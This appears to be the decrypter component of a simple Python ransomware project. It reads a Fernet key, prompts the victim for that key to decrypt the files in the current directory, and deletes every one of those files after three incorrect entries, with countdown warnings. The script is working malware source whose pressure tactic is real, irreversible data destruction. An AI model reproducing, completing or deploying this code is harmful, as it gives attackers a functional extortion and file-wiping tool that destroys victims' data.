#!/usr/bin/env python3

# pip install -r requirements.txt

import os
# import shutil   # to delete non-empty folder using rmtree()
# pip install cryptography
from cryptography.fernet import Fernet


files = []
global count

for file in os.listdir():
    if file == "encrypter.py" or file == "decrypter.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):    #ignore folders
        files.append(file)
    
# print(files)

with open("thekey.key", "rb") as thekey:
    secretkey = thekey.read().decode("utf-8")   #secret key is Byte, not String

# print(secretkey.decode("utf-8"))


count = 3

while(count!=0):
    userkey = input("Enter the secret key to decrypt your files\n")
    
    if userkey == secretkey:
        for file in files:
            with open(file, "rb") as thefile:
                content = thefile.read()

            content_decrypted = Fernet(secretkey).decrypt(content)

            with open(file, "wb") as thefile:
                thefile.write(content_decrypted)

        print("Sucessfully Decrypted\n")
        os.remove("thekey.key")
        break
    else:
        count -= 1
        print(f"Warning!... Will Delete all files in next {count} Incorrect tries\n")


if count == 0:
    for file in files:
        os.remove(file)
    print("Deleted all files!\n")
